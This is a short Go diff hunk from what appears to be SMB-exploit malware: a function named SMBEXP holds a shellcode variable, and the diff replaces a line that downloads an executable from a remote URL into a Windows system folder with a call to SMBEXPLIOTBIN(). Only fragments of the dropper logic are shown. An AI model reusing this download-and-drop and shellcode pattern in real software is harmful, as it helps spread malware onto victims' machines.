@@ -15,7 +15,7 @@ import (
 )
 
 func SMBEXP() {
-	DownloadFile("https://sourceforge.net/projects/app/files/main.exe/download", "calc.bin","C://windows/loveorhate")
+	SMBEXPLIOTBIN()
 	var (
 		shellcode string
 	)
